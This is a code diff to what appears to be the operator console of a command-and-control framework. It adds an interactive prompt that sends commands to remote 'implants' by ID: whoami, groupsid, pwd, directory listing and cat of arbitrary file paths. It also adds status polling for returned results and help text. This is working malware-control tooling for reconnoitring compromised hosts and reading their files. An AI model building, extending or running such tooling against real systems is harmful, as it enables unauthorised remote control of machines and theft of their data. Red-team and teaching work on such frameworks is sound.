@@ -4,6 +4,7 @@ import getpass
 import ssl
 from termcolor import colored, cprint
 
+available_commands = ['pwd','dir','whoami','groupsid','cat']
 
 def authenticate_user(uname_retr: str, pw_retr: str) -> str:
     """
@@ -104,8 +105,36 @@ if __name__ == "__main__":
         match choice:
             case "1":
                 implant_id = input("Enter implant ID: ")
-                command = input("Enter command to send: ")
-                unified_send("PUB", uname, session_token, implant_id, command)
+                command = input(f"{implant_id} > ")
+                split_command = command.split(" ")
+                while split_command[0].lower() != "exit":
+                    match split_command[0].lower():
+                        case "":
+                            print("Available commands: pwd, whoami, groupsid, dir, cat, status, help")
+
+                        case "status":
+                            unified_send("RTR", uname, session_token, implant_id)
+
+                        case "help":
+                            try:
+                                help_command = split_command[1]
+                            except:
+                                help_command = ""
+                            match help_command.lower():
+                                case "pwd": print("Returns current working directory")
+                                case "whoami": print("Returns current user")
+                                case "groupsid": print("Returns all group IDs")
+                                case "dir": print("Returns contents of directory. Requires full directory path")
+                                case "cat": print("Reads a file. Requires the full file path")
+                                case "status": print("Returns any waiting command results")
+                                case _: print("Help requires the command as a param, i.e. 'help dir'")
+                        case _:
+                            if split_command[0] in available_commands:
+                                unified_send("PUB", uname, session_token, implant_id, command.lower())
+
+                    command = input(f"{implant_id} > ")
+                    split_command = command.split(" ")
+
             case "2":
                 implant_id = input("Enter implant ID: ")
                 unified_send("RTR", uname, session_token, implant_id)
